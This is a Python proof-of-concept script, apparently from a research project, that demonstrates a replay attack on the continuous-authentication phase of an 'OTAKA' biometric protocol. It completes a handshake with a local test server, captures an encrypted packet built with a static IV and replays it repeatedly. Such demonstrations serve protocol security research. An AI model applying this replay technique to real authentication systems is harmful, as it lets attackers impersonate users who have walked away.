import socket
import json
import numpy as np
import time
import pandas as pd
from sklearn.model_selection import train_test_split

# --- Import helper functions ---
from src.otaka_protocol.helper import (
    canonical_hash, h, hex_to_str, str_to_hex, xor_data, get_timestamp, 
    check_timestamp, send_message, recv_message,
    rlwe_generate_keypair, rlwe_compute_shared_secret, Mod2,
    encrypt_data
)

# --- Colors ---
RESET = "\033[0m"
BOLD = "\033[1m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"

# --- Configuration ---
HOST = '127.0.0.1'
PORT = 65432
DELTA_T = 10
CLIENT_STORAGE_FILE = "client_storage.json"
DATASET_PATH = 'features_extracted.csv'
FEATURE_COLUMNS = [
    'strokeDuration', 'startX', 'startY', 'stopX', 'stopY',
    'directEndToEndDistance', 'meanResultantLength', 'upDownLeftRightFlag',
    'directionOfEndToEndLine', 'largestDeviationFromEndToEndLine',
    'averageDirection', 'lengthOfTrajectory', 'averageVelocity',
    'midStrokePressure', 'midStrokeArea'
]
# --- End Configuration ---


def truncate(x, n=20):
    """Return a short preview of x (string or list)."""
    if x is None:
        return "None"
    s = str(x)
    return s if len(s) <= n else s[:n] + "..."


def simulate_user_login():
    """Simulates the User Login Phase (Section IV-D)."""
    try:
        with open(CLIENT_STORAGE_FILE, "r") as f:
            client_data = json.load(f)
    except FileNotFoundError:
        print(f"{RED}Error:{RESET} '{CLIENT_STORAGE_FILE}' not found.")
        print("Please run 'python -m src.otaka_protocol.registration' first.")
        return None

    IDi_input = "1.0"
    PWi_star_input = "password123"
    BMi_star_input = "biometric_data_scan_1"
    
    sigma_i_star = h(BMi_star_input)
    t3_rec = xor_data(client_data['t3_star'], h(sigma_i_star, IDi_input))
    x_rec_hex = xor_data(client_data['x_star'], h(PWi_star_input, sigma_i_star, t3_rec))
    t2_prime = xor_data(x_rec_hex, h(IDi_input, PWi_star_input, sigma_i_star))
    
    if t2_prime == client_data['t2']:
        return {
            "IDi": client_data['IDi'], "TIDi": client_data['TIDi'],
            "t3": t3_rec, "x_hex": x_rec_hex
        }
    else:
        return None


def load_one_live_vector(user_id):
    """Loads one live feature vector."""
    try:
        df = pd.read_csv(DATASET_PATH)
    except FileNotFoundError:
        print(f"{RED}Error:{RESET} Dataset '{DATASET_PATH}' not found.")
        return None
    
    df['upDownLeftRightFlag'], _ = pd.factorize(df['upDownLeftRightFlag'])
    user_df = df[df['user_id'] == float(user_id)]
    
    if user_df.empty:
        print(f"{RED}Error:{RESET} No vectors found for user_id {user_id}")
        return None
        
    _, test_data = train_test_split(user_df, test_size=0.20, shuffle=False)
    if test_data.empty:
        print(f"{RED}Error:{RESET} No live test vectors found for user {user_id}.")
        return None
        
    return test_data[FEATURE_COLUMNS].values.tolist()[0]


def run_attack():
    print(f"\n{CYAN}{'='*60}")
    print(f"  {BOLD}Demo: Continuous Authentication (CA) Replay Attack (CVE-2025-XXXX){RESET}")
    print("  Analyzes vulnerability of a static IV in the CA phase.")
    print(f"{'='*60}{RESET}")
    
    login_secrets = simulate_user_login()
    if not login_secrets:
        return

    my_IDi = login_secrets['IDi']
    my_TIDi = login_secrets['TIDi']
    my_t3 = login_secrets['t3']
    my_x_hex = login_secrets['x_hex']
    
    print(f"\n{YELLOW}[Phase 1: Legitimate Session & Packet Capture]{RESET}")
    
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            print(f"{GREEN}  ✓ MITM connection established to {HOST}:{PORT}{RESET}")

            # --- Handshake ---
            (f1, e1), ai = rlwe_generate_keypair()
            TS1 = get_timestamp()
            X1 = xor_data(str_to_hex(my_IDi), h(my_t3, TS1, my_TIDi))
            s1 = h(my_x_hex, TS1)
            s2 = xor_data(s1, h(my_t3, TS1, my_TIDi))
            X2 = h(np.array_str(ai), X1, TS1, my_TIDi, s2)
            M1 = {"X1": X1, "X2": X2, "TIDi": my_TIDi, "ai": ai, "s2": s2, "TS1": TS1}
            
            print(f"{BLUE}  Sending Message M1...{RESET}")
            print(f"    TIDi: {truncate(my_TIDi)}")
            print(f"    TS1:  {truncate(TS1)}")
            print(f"    X1:   {truncate(X1)}  (len={len(X1)})")
            print(f"    X2:   {truncate(X2)}  (len={len(X2)})")
            send_message(s, M1)
            
            M2 = recv_message(s)
            bj, dj = np.array(M2['bj']), np.array(M2['dj'])
            print(f"  Received M2 → bj shape={bj.shape}, dj shape={dj.shape}, TS2={truncate(M2.get('TS2'))}")
            
            # Compute session keys
            c_prime_j = rlwe_compute_shared_secret(f1, bj)
            w_prime_j = Mod2(c_prime_j, dj)
            SK_ij = h(my_IDi, w_prime_j, M2['TS2'], TS1, s1, my_t3, my_TIDi)
            hash_hex_cli = canonical_hash(SK_ij, M2['TS2'], my_t3, my_TIDi)
            TIDn_hex = xor_data(M2['TIDn_star'], hash_hex_cli)
            TIDn = hex_to_str(TIDn_hex)
            my_TIDi_next = TIDn
            
            TS3 = get_timestamp()
            ACK = canonical_hash(my_TIDi_next, SK_ij, TS3)
            M3 = {"ACK": ACK, "TS3": TS3}
            send_message(s, M3)
            print(f"{GREEN}  ✓ OTAKA Handshake complete. Session live.{RESET}")

            # --- Capture Phase ---
            print(f"\n{YELLOW}[Phase 2: Capture Valid CA Packet (P_valid)]{RESET}")
            full_hash_iv = h(my_t3, TS3)
            iv = full_hash_iv[:32]
            print(f"  1. Captured static IV (preview): {truncate(iv)}")

            captured_vector = load_one_live_vector(my_IDi)
            if not captured_vector:
                raise ValueError("No live vectors found to capture.")
            print(f"  2. Captured live feature-vector: {truncate(captured_vector, 80)}")
            print(f"     vector length: {len(captured_vector)} features")

            vector_json = json.dumps(captured_vector)
            encrypted_hex = encrypt_data(SK_ij, iv, vector_json)
            P_valid_message = { "type": "CA_DATA", "payload": encrypted_hex }

            send_message(s, P_valid_message)
            response = recv_message(s)
            if response.get("status") != "OK":
                raise ValueError("Captured packet rejected.")
            
            print(f"  3. Captured valid encrypted packet P_valid (preview): {truncate(encrypted_hex)}")

            # --- Replay Phase ---
            print(f"\n{YELLOW}[Phase 3: Replay Attack Simulation]{RESET}")
            print("  Simulating user walking away... Replaying P_valid packets...\n")

            replay_attempts = 3
            replay_successes = 0
            for i in range(replay_attempts):
                time.sleep(1)
                print(f"  Attempt {i+1}: {BLUE}Injecting replay packet...{RESET}")
                send_message(s, P_valid_message)
                response = recv_message(s)
                if response and response.get("status") == "OK":
                    print(f"    {GREEN}✓ Accepted by server.{RESET}")
                    replay_successes += 1
                else:
                    print(f"    {RED}✗ Rejected or terminated.{RESET}")
                    break

            rar = (replay_successes / replay_attempts) * 100
            print(f"\n{CYAN}--- Attack Summary ---{RESET}")
            print(f"Replay Acceptance Rate (RAR): {replay_successes}/{replay_attempts} ({rar:.0f}%)")

            if rar == 100:
                print(f"\n{GREEN}{BOLD}SUCCESS:{RESET} Vulnerability confirmed — static IV reuse detected.")
            else:
                print(f"\n{RED}{BOLD}FAILURE:{RESET} Replay attack not fully successful.")
            
    except (ValueError, ConnectionError, socket.error) as e:
        print(f"{RED}[Attacker Error]{RESET} {truncate(e, 120)}")
    finally:
        print(f"{MAGENTA}[Attacker]{RESET} Connection closed.")


if __name__ == "__main__":
    try:
        from src.otaka_protocol.helper import add_laplace_noise
    except ImportError:
        print(f"{RED}ERROR:{RESET} 'add_laplace_noise' missing in helper.py.")
    
    print(f"{CYAN}Ensure your VSS and OTAKA servers are running in separate terminals.{RESET}")
    run_attack()
